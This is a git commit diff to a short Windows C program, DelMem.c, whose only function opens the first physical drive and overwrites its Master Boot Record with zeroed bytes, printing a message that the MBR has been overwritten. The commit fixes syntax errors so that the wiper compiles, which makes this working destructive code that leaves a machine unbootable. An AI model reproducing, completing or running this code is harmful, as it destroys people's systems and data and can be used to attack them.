6e6125b7ca7b23d0f44a91d392fe39491c25bffd
Shah Jabir <58883768+ShahJabir@users.noreply.github.com>
2020-06-01 10:44:29 +0600

    Update Delmem.c
    Some error fixed

--- DelMem.c
+++ DelMem.c
@@ -1,8 +1,6 @@
 #include <stdio.h>
 #include<Windows.h>
 
-using namespace std;
-
 /* run this program using the console pauser or add your own getch, system("pause") or input loop */
 
 int main(int argc, char** argv) {
@@ -12,13 +10,13 @@ int main(int argc, char** argv) {
 	ZeroMemory(&mbrData, (sizeof mbrData));
 	HANDLE MasterBootRecord = CreateFile("\\\\.\\PhysicalDrive0"
 	,GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE
-	, NULL, OPEN_EXISTING, NULL, NULL )
+	, NULL, OPEN_EXISTING, NULL, NULL );
 	if (WriteFile(MasterBootRecord, mbrData, MBR_SIZE, &write, NULL)==TRUE){
-		printf("Master Boot Record is over written!\n")
+		printf("Master Boot Record is over written!\n");
 		
 	}
 	else{
-		printf("\nFail")
+		printf("\nFail");
 		Sleep(5000);
 	}
 	CloseHandle(MasterBootRecord);
